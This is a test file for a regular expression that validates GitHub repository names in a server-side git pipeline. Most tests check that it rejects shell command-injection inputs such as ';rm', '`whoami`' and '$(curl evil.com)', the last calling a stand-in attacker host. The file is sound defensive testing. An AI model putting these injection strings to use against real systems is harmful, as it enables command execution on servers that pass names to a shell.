import { describe, expect, test } from "bun:test";
import { GITHUB_NAME_RE } from "$lib/server/pipeline/git.js";

describe("GITHUB_NAME_RE", () => {
	test("accepts lowercase alpha", () => {
		expect(GITHUB_NAME_RE.test("facebook")).toBe(true);
	});

	test("accepts uppercase alpha", () => {
		expect(GITHUB_NAME_RE.test("Facebook")).toBe(true);
	});

	test("accepts digits", () => {
		expect(GITHUB_NAME_RE.test("repo123")).toBe(true);
	});

	test("accepts hyphens", () => {
		expect(GITHUB_NAME_RE.test("my-repo")).toBe(true);
	});

	test("accepts dots", () => {
		expect(GITHUB_NAME_RE.test("repo.js")).toBe(true);
	});

	test("accepts underscores", () => {
		expect(GITHUB_NAME_RE.test("my_repo")).toBe(true);
	});

	test("accepts mixed valid characters", () => {
		expect(GITHUB_NAME_RE.test("My-Repo_2.0")).toBe(true);
	});

	test("rejects empty string", () => {
		expect(GITHUB_NAME_RE.test("")).toBe(false);
	});

	test("rejects semicolon", () => {
		expect(GITHUB_NAME_RE.test(";rm")).toBe(false);
	});

	test("rejects backticks", () => {
		expect(GITHUB_NAME_RE.test("`whoami`")).toBe(false);
	});

	test("rejects $() substitution", () => {
		expect(GITHUB_NAME_RE.test("$(curl evil.com)")).toBe(false);
	});

	test("rejects pipe", () => {
		expect(GITHUB_NAME_RE.test("repo|evil")).toBe(false);
	});

	test("rejects ampersand", () => {
		expect(GITHUB_NAME_RE.test("repo&evil")).toBe(false);
	});

	test("rejects spaces", () => {
		expect(GITHUB_NAME_RE.test("repo name")).toBe(false);
	});

	test("rejects newlines", () => {
		expect(GITHUB_NAME_RE.test("repo\nevil")).toBe(false);
	});

	test("rejects single quotes", () => {
		expect(GITHUB_NAME_RE.test("repo'evil")).toBe(false);
	});

	test("rejects double quotes", () => {
		expect(GITHUB_NAME_RE.test('repo"evil')).toBe(false);
	});

	test("rejects backslash", () => {
		expect(GITHUB_NAME_RE.test("repo\\evil")).toBe(false);
	});
});
